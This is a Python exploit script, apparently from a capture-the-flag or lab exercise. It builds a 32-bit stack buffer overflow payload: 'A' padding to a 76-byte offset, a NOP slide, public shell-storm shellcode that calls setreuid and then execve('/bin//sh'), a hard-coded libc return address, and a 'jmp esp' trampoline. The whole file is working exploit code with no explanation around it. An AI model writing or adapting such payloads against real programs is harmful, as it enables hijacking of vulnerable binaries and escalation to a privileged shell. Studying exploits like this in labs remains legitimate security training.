#!/usr/bin/python3


import sys
import struct


padding_char = b"A"
word_size = 4

# shellcode:        http://shell-storm.org/shellcode/files/shellcode-399.php
#                   Yeongjin Jang@blue9057      [https://twitter.com/blue9057]
shellcode_399_variant = b"\x6a\x31\x58\x31\xd2\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"


if __name__ == "__main__":
    shellcode = shellcode_399_variant
    shellcode_length = len(shellcode)        
    offset = 76

    ins_jmp_backwards = b"\x83\xec\x30"  # 83EC30
    ins_jmp_stack = b"\xff\xe4"

    addr_ret = 0xf7ddf000 + 0x1778ab # 0xf7f568ab
    ret = struct.pack("I", addr_ret)
    
    backjump = 48   # 0x30
    padding = padding_char * (offset - backjump)
    nopeslide_length = backjump - shellcode_length
    nopeslide = b"\x90" * nopeslide_length
    payload = padding
    payload += nopeslide
    payload += shellcode
    
    payload += ret
    payload += ins_jmp_backwards
    payload += ins_jmp_stack
    
    sys.stdout.buffer.write(payload)

